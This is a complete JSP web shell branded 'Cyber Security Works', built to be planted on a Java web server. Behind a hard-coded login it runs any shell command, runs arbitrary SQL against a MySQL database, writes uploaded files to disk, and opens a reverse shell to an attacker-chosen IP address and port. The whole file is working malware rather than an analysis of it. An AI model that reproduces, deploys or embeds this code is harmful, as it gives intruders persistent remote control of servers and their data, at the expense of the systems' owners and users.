<%@page contentType="text/html"%>
<%@page language="java" %>
<%@page import="java.util.*,java.io.*,java.sql.*,java.security.*,java.net.*,java.lang.*"%>
<%

// authentication from kidz
String checkUser = "user";
String checkPass = "2744779489c967916b735155c1d28691";
// MySql database port
String dbPort = "3306";					// port (usually 3306)
// Dont touch the rest!
%>
<html><body>
<%
String myUser = request.getParameter("myUser");
String myPass = request.getParameter("myPass");
String dbH = request.getParameter("dbHost");
String dbN = request.getParameter("dbName");
String dbU = request.getParameter("dbUser");
String dbP = request.getParameter("dbPass");
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");
String contentType = request.getContentType();
Connection conn = null;
Statement statement = null;
ResultSet rs = null;
String shell = null;
//String sysName = System.getProperty("os.name");
if (System.getProperty("os.name").equals("Linux")){
	shell = "/bin/sh";
}
else{
	shell = "cmd.exe";
}
%>
<%!
// form factory to make all my forms
public String formFactory(int formType, String myMessage){
	String form = null;
	if (formType == 1){
		form = "<p>"+myMessage+"</p>" +
		"<form method=\"POST\" action=\"\">" +
		"<textarea rows=\"5\" cols=\"55\" wrap=\"off\" name=\"qry\">" + 
		"Enter SQL here" +
		"</textarea>" +
		"<p><input type=\"submit\" value=\"Execute SQL\"></p>" +
		"</form><hr>";
	}
	else if (formType == 2){
		form = "<h2>Cyber Security Works. <span style=\"font-size: small;\">" +
		"</span></h2>"+myMessage+"<br>" +
		"<form method=\"POST\" action=\"\">" +
		"<table>" +
		"<tr><td><b>Username: </b></td>" +
		"<td><input type=\"text\" name=\"myUser\" size=\"20\"></td></tr>" +
		"<tr><td><b>Password: </b></td>" +
		"<td><input type=\"password\" name=\"myPass\" size=\"20\"></td></tr>" +
		"</table>"+
		"<p><input type=\"submit\" value=\"Submit\"></p>" +
		"</form>";
	}
	else if (formType == 3){
		form = "<p>"+myMessage+"</p>" +
		"<form method=\"POST\" action=\"\">" +
		"<table>" +
		"<tr><td><b>Database name: </b></td>" +
		"<td><input type=\"text\" name=\"dbName\" size=\"20\"></td></tr>" +
		"<tr><td><b>Database host: </b></td>" +
		"<td><input type=\"text\" name=\"dbHost\" size=\"20\"></td></tr>" +
		"<tr><td><b>Database user: </b></td>" +
		"<td><input type=\"text\" name=\"dbUser\" size=\"20\"></td></tr>" +
		"<tr><td><b>Database pass: </b></td>" +
		"<td><input type=\"password\" name=\"dbPass\" size=\"20\"></td></tr>" +
		"</table>"+
		"<p><input type=\"submit\" value=\"Submit\"></p>" +
		"</form><hr>";
	}
	else if (formType == 4){
		form = "<h2>Cyber Security Works <span style=\"font-size: small;\">" +
		"</span></h2>"+myMessage+"" +
		"<form method=\"POST\" action=\"\">" +
		"<table>" +
		"<tr><td><b>cmd: </b></td>" +
		"<td><input type=\"text\" name=\"cmd\"" +
		"value=\"Enter cmd here\"size=\"40\"></td></tr>" +
		"</table>"+
		"<p><input type=\"submit\" value=\"Submit\">" +
		"<input type=\"submit\" name=\"ciao\" value=\"logout\"></p>" +
		"</form>";
	}
	else if (formType == 5){
		form = "<form method=\"post\" ACTION=\"\" name=\"upform\""+ 		
		"ENCTYPE='multipart/form-data'>" +
		"<input type=\"file\" name=\"uploadfile\">" +
		"<input type=\"submit\" name=\"Submit\" value=\"Submit\">" +
		"<input type=\"reset\" name=\"Reset\" value=\"Reset\">" +
		"<input type=\"hidden\" name=\"action\" value=\"upload\">" +
		"</form>";
	}
	else if (formType == 6){
		form = "<form method=\"POST\"><b>IP Address: </b>" +
		"<input type=\"text\" name=\"ipaddress\" size=15><b> Port: </b>" +
		"<input type=\"text\" name=\"port\" size=5>" +
		"<input type=\"submit\" name=\"Connect\" value=\"Connect back\">" +
		"</form>";	
	}	
	return form;
}
// md5 routine from Jonathan Snook (snook.ca)
public String getMd5(String plainText){
	try{
		MessageDigest mdAlgorithm = MessageDigest.getInstance("MD5");
		mdAlgorithm.update(plainText.getBytes());
		byte[] digest = mdAlgorithm.digest();
		StringBuffer hexString = new StringBuffer();
		for (int i = 0; i < digest.length; i++) {
    			plainText = Integer.toHexString(0xFF & digest[i]);
			if (plainText.length() < 2) {
        			plainText = "0" + plainText;
    			}
    			hexString.append(plainText);
		}
		return (hexString.toString());
	}
	catch(NoSuchAlgorithmException e) { return(null); }
}

// reverse shell class from Tan Chew Keong (http://www.security.org.sg/code/jspreverse.html)
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe){}
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe){}
        }
}

%>
<%
String checkSes = (String)session.getAttribute("admin");
String dbSet = (String)session.getAttribute("dbSet");
if (checkUser.equals(myUser) && checkPass.equals(getMd5(myPass)) || checkSes == "yes"){
	// we are god mode
	session.setAttribute("admin","yes");
	if (request.getParameter("qry") != null) {
		out.println(formFactory(4, ""));
		out.println(formFactory(6, ""));
		out.println(formFactory(5, ""));
		String sqlForm = formFactory(1, "<br><i>Enter your SQL syntax</i>");
		String ModdedSqlForm = sqlForm.replace("Enter SQL here",request.getParameter("qry"));
		out.println(ModdedSqlForm);
		// who needs connection pools ;)
		Class.forName("com.mysql.jdbc.Driver").newInstance();
		String dbUser = (String)session.getAttribute("dbUser");
		String dbPass = (String)session.getAttribute("dbPass");
		String dbHost = (String)session.getAttribute("dbHost");
		String dbName = (String)session.getAttribute("dbName");
		String connectionURL = "jdbc:mysql://"+dbHost+":"+dbPort+"/"+dbName+"?";
		// Connect to MySql with our correct details
		try{
			conn = DriverManager.getConnection(connectionURL,dbUser,dbPass);
			statement = conn.createStatement();
			rs = statement.executeQuery(request.getParameter("qry"));
			ResultSetMetaData rsMetaData = rs.getMetaData();
			int numberOfColumns = rsMetaData.getColumnCount();
			// while there are rows in the result set
			while (rs.next()) {
			out.println("<p>");
				// for every column in every row
				for (int i = 1; i < numberOfColumns + 1; i++) {
      					String columnName = rsMetaData.getColumnName(i);
      					out.println("<b>"+columnName + "</b> : " + rs.getString(i));
    				}
			}
			out.println("</p>");
			rs.close();
			// safely close our sql connection
			if (conn != null) { 
				try { 
					conn.close(); 
				} catch (SQLException sqle) { 
					sqle.printStackTrace(); 
				} 
			}
		}
		catch(SQLException sqle){
			return;
		}
	}
	else if (request.getParameter("cmd") != null 
			&& request.getParameter("ciao") == null){
		String cmdShell = formFactory(4, "");
		String ModdedCmdShell = cmdShell.replace("Enter cmd here",request.getParameter("cmd"));
		out.println(ModdedCmdShell);
		out.println(formFactory(6, ""));
		out.println(formFactory(5, ""));
		if (dbU != null && dbP != null || dbSet == "yes"){
			session.setAttribute("dbSet","yes");
			session.setAttribute("dbHost",dbH);
			session.setAttribute("dbPass",dbP);
			session.setAttribute("dbName",dbN);
			session.setAttribute("dbUser",dbU);
			out.println(formFactory(1, "<br><i>Enter your SQL syntax:</i>"));
		}else{
			out.println(formFactory(3, "<br><i>Enter MySql details:</i>"));
		}
		// cmd shell from redteam-pentesting.de
		String cmd = request.getParameter("cmd");
		try{
			Process p = Runtime.getRuntime().exec(cmd);
			OutputStream os = p.getOutputStream();
			InputStream in = p.getInputStream();
			DataInputStream dis = new DataInputStream(in);
			String disr = dis.readLine();
			while ( disr != null ) {
				out.println(disr);
				disr = dis.readLine();
			}		
		}
		catch (IOException e){
			return;
		}			
	}
	// uploading our files
	else if ((contentType != null) && (contentType.indexOf("multipart/form-data") >= 0)) {
		DataInputStream in = new DataInputStream(request.getInputStream());
		int formDataLength = request.getContentLength();
		byte dataBytes[] = new byte[formDataLength];
		int byteRead = 0;
		int totalBytesRead = 0;
		while (totalBytesRead < formDataLength) {
			byteRead = in.read(dataBytes, totalBytesRead, formDataLength);
			totalBytesRead += byteRead;
		}
		String file = new String(dataBytes);
		String saveFile = file.substring(file.indexOf("filename=\"") + 10);
		saveFile = saveFile.substring(0, saveFile.indexOf("\n"));
		saveFile = saveFile.substring(saveFile.lastIndexOf("\\") + 	1,saveFile.indexOf("\""));
		int lastIndex = contentType.lastIndexOf("=");
		String boundary = contentType.substring(lastIndex + 1,contentType.length());
		int pos = file.indexOf("filename=\"");
		pos = file.indexOf("\n", pos) + 1;
		pos = file.indexOf("\n", pos) + 1;
		pos = file.indexOf("\n", pos) + 1;		
		int boundaryLocation = file.indexOf(boundary, pos) - 4;
		int startPos = ((file.substring(0, pos)).getBytes()).length;
		int endPos = ((file.substring(0, boundaryLocation)).getBytes()).length;
		FileOutputStream fileOut = new FileOutputStream(saveFile);
		fileOut.write(dataBytes, startPos, (endPos - startPos));
		fileOut.flush();
		fileOut.close();
		response.setHeader("Refresh", "0");
	}
	
	// reverse shell
	else if(ipAddress != null && ipPort != null){
		Socket sock = null;
        	try{
                	sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                	Runtime rt = Runtime.getRuntime();
			Process proc = rt.exec(shell);
                	StreamConnector outputConnector =
                        	new StreamConnector(proc.getInputStream(),
                                	sock.getOutputStream());
                	StreamConnector inputConnector =
                        	new StreamConnector(sock.getInputStream(),
                               	proc.getOutputStream());
                	outputConnector.start();
                	inputConnector.start();
        	}
        	catch(Exception e) {}
		response.setHeader("Refresh", "0");
	}

	// logout
	else if (request.getParameter("ciao") != null){
		session.invalidate();
		response.setHeader("Refresh", "0");
	}
	else{
		out.println(formFactory(4, ""));
		out.println(formFactory(6, ""));
		out.println(formFactory(5, ""));
		// check too see if database credz have been set
		if (dbU != null && dbP != null || dbSet == "yes"){
			session.setAttribute("dbHost",dbH);
			session.setAttribute("dbPass",dbP);
			session.setAttribute("dbName",dbN);
			session.setAttribute("dbUser",dbU);
			// test the credentials
			try{
				String connectionURL = "jdbc:mysql://"+dbH+":"+dbPort+"/"+dbN+"?";
				conn = DriverManager.getConnection(connectionURL,dbU,dbP);
				session.setAttribute("dbSet","yes");
				//out.print("session set, doh!");
			}
			catch(SQLException sqle){
				out.println(formFactory(3, "<br><b>" +
					"Credentials failed! </b><i>Enter MySql details:</i>"));
				return;
			}
			conn.close();
			out.println(formFactory(1, "<br><i>Enter your SQL syntax:</i>"));
		}else{
			out.println(formFactory(3, "<br><i>Enter MySql details:</i>"));
		}
	}
}
// if the username and password is incorrect
else if (myUser != null || myPass != null){
	session.setAttribute("admin","no");
	out.println(formFactory(2, "<br><b>username or password incorrect!</b>")); 
}
// we just loaded the page for the first time
else{
	session.setAttribute("admin","no");
	out.println(formFactory(2, ""));
} 
%>
</body></html>
